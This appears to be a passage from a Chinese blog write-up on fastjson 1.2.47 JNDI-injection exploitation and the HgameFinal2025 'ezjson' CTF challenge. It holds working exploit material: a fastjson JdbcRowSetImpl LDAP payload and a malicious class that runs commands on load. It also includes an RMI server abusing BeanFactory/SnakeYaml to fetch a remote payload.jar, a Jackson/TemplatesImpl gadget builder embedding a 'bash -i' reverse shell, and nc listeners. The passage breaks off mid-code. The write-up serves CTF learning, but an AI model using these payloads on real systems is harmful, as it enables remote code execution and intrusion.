函数打断点</p><p><img src="/img/fastjsonAndJNDI/B2X9bngFaoyaLzxffZPcUsMwnog.png"></p><p>步入此处 <code>lookup()</code></p><p><img src="/img/fastjsonAndJNDI/DGWCbWBmPoTSuZxpWqcc4aLHn7e.png"></p><p>额似乎步入的是 <code>getDataSourceName()</code>，获取 <code>DataSourceName</code> 参数内容</p><p><img src="/img/fastjsonAndJNDI/VBpBbwOvDoYvYSxFHbTc7hnJnzc.png"></p><p>步过回到刚才的位置再次步入就进到 <code>lookup()</code> 函数的调用了，位于 <code>InitialContext</code> 类（可以参考<a href="https://www.cnblogs.com/nice0e3/p/13958047.html#initialcontext%E7%B1%BB">这里</a>了解一下）。继续步入，选中 <code>lookup(name)</code></p><p><img src="/img/fastjsonAndJNDI/CKaUbhWlIoaaIhx9orlcoDL1nHh.png"></p><p>进入 <code>ldapURLContext</code> 类，继续向 <code>lookup(var1)</code> 步入</p><p><img src="/img/fastjsonAndJNDI/O93jbV5GZoMg05xFqt3cdOLQnCd.png"></p><p>进入 <code>GenericURLContext</code> 类，先 <code>this.getRootURLContext(var1, this.myEnv)</code> 和 <code>var2.getResolvedObj()</code> 大概对参数做一下解析，获取其中的 ldap 服务 ip 和远程类名</p><p><img src="/img/fastjsonAndJNDI/TpR3bgnLHoiXJdxZ5cUcyxa4nAV.png"></p><p>尝试继续步入 <code>lookup(var2.getRemainingName())</code> 选中 <code>lookup</code></p><p><img src="/img/fastjsonAndJNDI/TVpMbZ69AoACdSxbPDUcFDz5niN.png"></p><p>该句步过后则结束跳出到下图了，没有再继续深入分析下去了……</p><p><img src="/img/fastjsonAndJNDI/RYxibeFlkoztihxTM23cQoqEnEg.png"></p><p>恶意代码成功执行，系统命令成功执行，弹出计算器</p><h2 id="补充：ldap-服务端"><a href="#补充：ldap-服务端" class="headerlink" title="补充：ldap 服务端"></a>补充：ldap 服务端</h2><p>为了方便、节省时间，用的 Yakit 的反连服务器搭建 ldap 服务端，用 marshalsec 也 OK，网上有很多现成的拿来改一下即可。</p><p><img src="/img/fastjsonAndJNDI/PJQabTVjqoF9vaxRJXqcTpJwnIe.png"></p><p>生成的恶意利用类 payload 如下（存疑）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> defaultpackagename;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrIXqXOz</span> &#123;<br>        <span class="hljs-keyword">static</span>  &#123;<span class="hljs-comment">//静态代码块，首次加载时自动执行</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">var0</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<span class="hljs-comment">//要执行的命令</span><br>                <span class="hljs-comment">//通过文件分隔符检测Unix/Linux系统</span><br>                <span class="hljs-comment">//这里似乎有些问题 Windows系统返回&quot;\&quot;，应该再写一个else？</span><br>                <span class="hljs-comment">//但是无论如何复现时在windows上是可以执行命令的</span><br>                <span class="hljs-keyword">if</span> (File.separator.equals(<span class="hljs-string">&quot;/&quot;</span>))&#123;<br>                        String[] var1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<span class="hljs-comment">//空的？？？</span><br>                &#125;<br>                <span class="hljs-keyword">try</span>&#123;<br>                        Runtime.getRuntime().exec(var1);<span class="hljs-comment">//用Runtime类执行</span><br>                &#125;<span class="hljs-keyword">catch</span>(IOException var1)&#123;<br>                        var1.printStackTrace();<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>正常应该是这样的吧：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> defaultpackagename;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">PrIXqXOz</span> </span>&#123;<br>        <span class="hljs-keyword">static</span>  &#123;<span class="hljs-comment">//静态代码块，首次加载时自动执行</span><br>                <span class="hljs-keyword">String</span>[] var1;<br>                <span class="hljs-keyword">if</span> (File.separator.equals(<span class="hljs-string">&quot;/&quot;</span>))&#123;<span class="hljs-comment">//通过文件分隔符检测 Unix/Linux系统</span><br>                        var1 = <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//通过文件分隔符检测 windows系统</span><br>                        var1 = <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>                &#125;<br>                <br>                <span class="hljs-keyword">try</span>&#123;<br>                        Runtime.getRuntime().exec(var1);<span class="hljs-comment">//用Runtime类执行</span><br>                &#125;<span class="hljs-keyword">catch</span>(IOException var1)&#123;<span class="hljs-comment">//如果命令执行发生异常捕获IOException防止进程崩溃</span><br>                        var1.printStackTrace();<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><div class="note note-warning">            <p><strong>补充：</strong>以下是我最初画的图，但后来发现 JNDI 部分不够准确（懒得改了），由于一开始我用的是 Yakit（用了协议端口复用技术）而没有自己写服务端，我混淆了流程中的两个步骤，在下图的步骤 6、7 中应当是一次 ldap 请求获取 Reference，一次 http 请求获取远程类（请求类型和远程类地址等均由 Reference 指定），需要两个服务端。该图仅针对上面的分析流程，看个大概即可。</p>          </div><p><img src="/img/fastjsonAndJNDI/A9J7bOwKnoumiNxpexTcJmtanGf.png"></p><div class="note note-warning">            <p>在网上看到了（据说是）bitterz 师傅的流程图如下，一下子给我点通了不少，在这里也补充一些 JNDI 注入的内容。该图展示的是 JNDI 注入的流程，先使用 rmi 或 ldap 进行一次指定地址的通信，按所给类名查找并获取其对应的 Reference 类（该类是 javax.naming 的一个类，表示对在命名&#x2F;目录系统外部找到的对象的引用。我的理解是相当于给你一个清单，告诉你要做啥、要准备啥（类）），其中包含了要在客户端（受害者）创建的类、所需的工厂类及地址，那么工厂类首先在本地 ClassPath 中寻找加载，找不到则从 Reference 指定的远程地址下载工厂类 Factory，然后将其实例化触发恶意代码的执行。<br>那么结合“补充：ldap 服务端”部分的截图可知，当 jdk 版本不符合要求时，第 4 步骤受影响未能发出请求，从而 Yakit 服务端只接收到 ldap 请求获取 Reference 而无 http 请求下载工厂类。这具体是为什么呢？在下面“其他版本的绕过”jdk 部分结合流程图继续分析……</p>          </div><p><img src="/img/fastjsonAndJNDI/WqLZb4gQGoeGDPxb7bfcrLxMn0L.png" alt="来自bitterz"></p><h1 id="其他版本的绕过"><a href="#其他版本的绕过" class="headerlink" title="其他版本的绕过"></a>其他版本的绕过</h1><h2 id="Jdk-关于-JNDI-注入"><a href="#Jdk-关于-JNDI-注入" class="headerlink" title="Jdk-关于 JNDI 注入"></a>Jdk-关于 JNDI 注入</h2><p>主要参考 <a href="https://www.cnblogs.com/R0ser1/p/17105579.html">R0ser1</a>、<a href="https://www.cnblogs.com/bitterz/p/15946406.html">bitterz</a>、<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">KINGX</a>，这里仅简要说明</p><p><strong>RMI：</strong>在 JDK 6u141, JDK 7u131, JDK 8u121 中 Java 限制了 Naming&#x2F;Directory 服务中 JNDI  Reference 远程加载 Object Factory 类的特性。系统属性  <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。</p><p><strong>LDAP：</strong>在 Oracle JDK 11.0.1、8u191、7u201、6u211 之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为 false，ldap 也同样无法远程加载 Reference 工厂类。</p><p>总而言之，当 jdk 版本较高时上图（bitterz 师傅的流程图）第 4 步骤在系统默认情况下外部工厂类不受信任，为禁用状态，普通的利用方式也就行不通了。那么有什么 jdk 高版本 JNDI 注入绕过方式呢？</p><ul><li>思路一：执行步骤 3 时，利用受害者本地的工厂类实现 RCE</li><li>思路二：受害者向 LDAP 或 RMI 服务器请求 Reference 类后，将从服务器下载字节流进行反序列化获得 Reference 对象，此时即可利用反序列化 gadget 实现 RCE</li></ul><h3 id="利用本地的工厂类"><a href="#利用本地的工厂类" class="headerlink" title="利用本地的工厂类"></a>利用本地的工厂类</h3><p>这个思路比较清晰，既然第 4 步被禁用，那么就尝试在此之前从本地加载工厂类。这个方法需要能够探测出使用的依赖或者是白盒审计知道有哪些依赖。这里主要有两种方式，均需要有 Tomcat 的依赖，触发有大概 Tomcat7、8 的版本限制，高版本的 Tomcat 或许可以参考一下 <a href="https://xz.aliyun.com/news/16156">https://xz.aliyun.com/news/16156</a></p><ul><li>基于 org.apache.naming.factory.BeanFactory：该类有一个 getObjectInstance()方法会把 Reference 对象的 className 属性作为类名去调用无参构造方法实例化一个对象。然后再从 Reference 对象的 Addrs 参数集合中取得 AddrType 是 forceString 的 String 参数。其中 propName 和 param 可以用于反射调用指定的方法。那么利用该类就可以调用本地其他依赖的类实现攻击。常见可利用的包括 ELProcessor、groovy、SnakeYaml 等等。</li><li>基于 org.apache.catalina.users.MemoryUserDatabaseFactory：主要是可以通过 XXE 实现 RCE，具体未作研究</li></ul><h3 id="服务端返回数据流反序列化-gadget"><a href="#服务端返回数据流反序列化-gadget" class="headerlink" title="服务端返回数据流反序列化 gadget"></a>服务端返回数据流反序列化 gadget</h3><p>rmi 和 ldap 服务除了返回 Reference 外也可以直接返回一段恶意序列化数据，不走原本的 3、4 步，然后使用合适的可用依赖反序列化 gadget</p><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>对于 fastjson 其他版本，除了太老的版本外基本都是在 <code>checkAutoType()</code> 上做改动，许多涉及的设置、参数在本文当中也有提到，例如：</p><p>1.2.47 前的一些版本中漏洞主要出现在字符串处理，通过插入描述符 <code>[</code>、<code>L</code>、<code>;</code> 或双写等方法绕过检测；</p><p>1.2.68 版本中 <code>MiscCodec</code> 设置了 <code>cache</code> 默认为 false 后可以利用 <code>expectClass</code> 绕过 <code>checkAutoType()</code>，1.2.47 时上面的分析可以看到 <code>expectClass</code> 默认为 null，1.2.68 时如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，那么就可以通过 <code>checkAutoType()</code> 的安全检测；</p><p>总而言之，对 1.2.47 的漏洞一整个研究理解下来之后再去看别的版本会轻松一些，这里不再细致分析了，具体内容就去看参考的这几篇文章即可：</p><p><a href="https://su18.org/post/fastjson/">https://su18.org/post/fastjson/</a></p><p><a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></p><p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a></p><h1 id="HgameFinal2025-赛题复现-ezjson"><a href="#HgameFinal2025-赛题复现-ezjson" class="headerlink" title="HgameFinal2025 赛题复现-ezjson"></a>HgameFinal2025 赛题复现-ezjson</h1><h2 id="打开-jar-包配置调试项目"><a href="#打开-jar-包配置调试项目" class="headerlink" title="打开 jar 包配置调试项目"></a>打开 jar 包配置调试项目</h2><p>题目给了后端 jar 包，我们需要对其进行调试分析。跟 Hgame2025 的 SigninJava 一样，在 idea 里 Add as Library 添加为库即可查看源码，但是这里（及以上漏洞复现）我为了能够调试分析更深层的原理，于是手动迁移项目：</p><p>idea 新建空项目，将 jar 包用解压缩软件打开并复制其中 <code>/BOOT-INF/classes/</code> 内的内容至 idea 空项目的 <code>/src/main/java/</code> 下</p><p><img src="/img/fastjsonAndJNDI/JKCTbzL4CoEfm5x5Oyxc3dFLnsh.png"></p><p>但此时仍为里面 <code>.class</code> 文件，于是使用 jd-gui 工具将其反编译为 <code>.java</code> 源文件替换入新项目</p><p><img src="/img/fastjsonAndJNDI/Knmsbj5UtoxpNyxplNTcoMoNnpd.png"></p><p><img src="/img/fastjsonAndJNDI/EqglbFfG4ocImhxTHNocpovbnrh.png"></p><p>然后将 <code>/BOOT-INF/lib/</code> 下的依赖全部导入新项目</p><p><img src="/img/fastjsonAndJNDI/EY3PbTSdEoL9Nzx4Iemc0ZGVnWb.png"></p><p><img src="/img/fastjsonAndJNDI/DfMsbIl8hobbkKxFWgZcSA2gnKb.png"></p><p>至此项目迁移完毕</p><h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>其中 Controller 源码如下（其他没有什么可看的了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> hgame.mysid.ezjson.Controller;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.util.Set;<br><br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">mainController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to Hgame2025-Final.&quot;</span>;<br>    &#125;<br>   <br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/parse&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseJson</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String json)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON._parseObject_(json);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Parsed: &quot;</span> + obj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所有依赖如下</p><p><img src="/img/fastjsonAndJNDI/EuMPbfHRToyF4Exfh78ckJWInrh.png"></p><h2 id="尝试过程"><a href="#尝试过程" class="headerlink" title="尝试过程"></a>尝试过程</h2><p>显而易见考察的是 fastjson1.2.47 反序列化漏洞的利用。于是我先尝试的是最简单的 JdbcRowSetImpl 用 ldap 返回 Reference 加载远程类的方式。</p><p>还是偷个懒，不在服务器上重新搞过了，就开一个 ssh 反向隧道把本地 Yakit 反连服务器的端口映射到云服务器上去做题，本地跑一下题目的文件，然后 ldap 放云服务器的 ip 和端口。发包，成功执行命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -fNR 8520:localhost:8085 root@ip 创建ssh反向隧道<br>ps aux | grep &quot;ssh -NfR&quot; 查看ssh连接情况<br>netstat -tuln | grep 8520 查看端口状态<br>nc -l -p 8520 nc监听请求<br>nc -lvvp 12345 接收反弹shell<br></code></pre></td></tr></table></figure><p>payload 改一下云服务器 ip 其他和前面的复现一致</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8085/PrIXqXOz&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>证明当前 jdk8u181 环境下该利用方式可行，与云服务器连接正常</p><p><img src="/img/fastjsonAndJNDI/P2nXbbauYoA95kx5cFqctNnJnfc.png"></p><p>然而当我去打开靶机用同样的方式尝试时，发现远程恶意类下载失败，只有 LDAP 连接没有 HTTP 连接，推测可能是靶机 jdk 版本高于 oracle 8u191，<code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为 false</p><div class="note note-warning">            <p><strong>纠错：</strong>后来发现，由于偷懒，其实返回的 Reference 就有问题（如下图）。我发送的 json payload 中地址使用的是云服务器 ip，靶机可以正常访问，然而靶机接收到 Reference 后 Reference 内的远程 Factory 地址为 127.0.0.1 没有更改，靶机压根就不会再访问云服务器，而本地测试自然就不会有问题。一开始原理没有弄懂，但似乎歪打正着了，难绷……</p>          </div><p><img src="/img/fastjsonAndJNDI/EfYIbDPmuokjadxXcoPc0Clsnac.png"></p><p>去包里的 MANIFEST.MF 文件查看 jar 包的打包编译版本发现是 1.8，但没有再具体的版本号了。推测可能大于 oracle 8u191。</p><p><img src="/img/fastjsonAndJNDI/Sdnsbzp5NoXufpx46rsckGRjnxb.png"></p><p>后续思路或许就要考虑 JNDI 的高版本绕过，关注一下依赖发现有 spring、Tomcat、Jackson、log4j2、SnakeYaml 这些，从中寻找可利用的链</p><p>我首先尝试的是基于本地工厂类的绕过方式：</p><p>先写一个恶意静态类，然后打包为 jar 包，<code>python -m http.server 9999</code> 在文件所在目录快速起一个 http 服务以供获取恶意 jar 包。</p><p>我用如下 rmi 服务端返回一个 Reference，用 BeanFactory 去调用 SnakeYaml 反序列化 payload，从而远程下载我准备好的恶意 payload.jar 用 ScriptEngineManager 去加载、实例化、运行恶意代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.jndi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi_bypass_snakeYaml</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry._createRegistry_(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>                <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +<br>                <span class="hljs-string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:9999/payload.jar\&quot;]\n&quot;</span> +<br>                <span class="hljs-string">&quot;  ]]\n&quot;</span> +<br>                <span class="hljs-string">&quot;]&quot;</span>;<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=load&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, context));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, referenceWrapper);<br>        System._out_.println(<span class="hljs-string">&quot;Server Started!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是基于 beanfactory 使用 SnakeYaml 的绕过失败：我调试客户端（app.jar）运行过程，发现 tomcat9 版本禁用了 <code>ForceString</code>，导致无法给属性强制指定 <code>setter</code> 方法，也就无法进一步的调用目的类。这里不再赘述，具体实现参考“其他版本的绕过”部分引用的文章。</p><p><img src="/img/fastjsonAndJNDI/Njcjbvwf8oCKwtxyqIAcZft2nvd.png"></p><p>再尝试服务端返回数据流反序列化 gadget：</p><p>由于网上常见的 cc 链解法在该题中并没有其依赖无法实现，加上时间原因没有好好学，所以这里卡住了一下。经过 mys1d 佬指点以及进一步的网络搜索，发现本题可以通过 Jackson 的原生反序列化漏洞解决（佬：Jackson 依赖是 springboot 自带的，大概 jdk11 以下版本都能用这条链）。</p><p>常见的 Jackson 反序列化漏洞与 fastjson 类似，为了满足多态需求，设置了全局 Default Typing 机制和 JsonTypeInfo 注解，通过这些可以实现任意指定类的反序列化，有大概四个较低 Jackson 版本及 jdk 版本的 CVE。但本题的 Jackson 版本等均不符合条件，所以需要通过原生反序列化漏洞来打。</p><p>使用如下代码生成字节流并 base64 处理输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.jndi;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserial_jackson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取BaseJsonNode类并删除 writeReplace 方法，避免利用链被破坏</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool._getDefault_();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br>        <span class="hljs-comment">//构造一个动态生成的类 a，继承自 AbstractTranslet，其中写入恶意命令反弹 shell</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;,ctClass);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,此处写base64加密后的字符串不需要引号&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        ctClass.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>        <span class="hljs-comment">//TemplatesImpl用于加载字节码实例化恶意类，调用 newTransformer() 时自动加载 _bytecodes 指定的类</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        _setFieldValue_(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<span class="hljs-comment">//a 的字节码</span><br>        _setFieldValue_(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        _setFieldValue_(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span><br>        